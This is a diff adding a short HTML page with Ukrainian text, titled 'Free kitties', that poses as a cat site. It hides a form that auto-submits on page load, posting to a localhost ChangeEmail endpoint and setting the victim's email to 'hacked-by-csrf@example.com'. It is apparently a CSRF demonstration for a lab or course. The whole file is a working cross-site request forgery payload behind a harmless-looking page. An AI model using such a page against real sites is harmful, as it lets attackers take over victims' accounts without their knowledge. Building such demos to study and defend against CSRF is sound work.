@@ -1,0 +1,18 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Безкоштовні котики</title>
+</head>
+<body>
+    <h1>Вітаємо на сайті милих котиків!</h1>
+
+    <!-- прихована форма CSRF -->
+    <form id="evil" action="https://localhost:7294/Home/ChangeEmail" method="POST">
+        <input type="hidden" name="newEmail" value="hacked-by-csrf@example.com" />
+    </form>
+
+    <script>
+        document.getElementById("evil").submit();
+    </script>
+</body>
+</html>
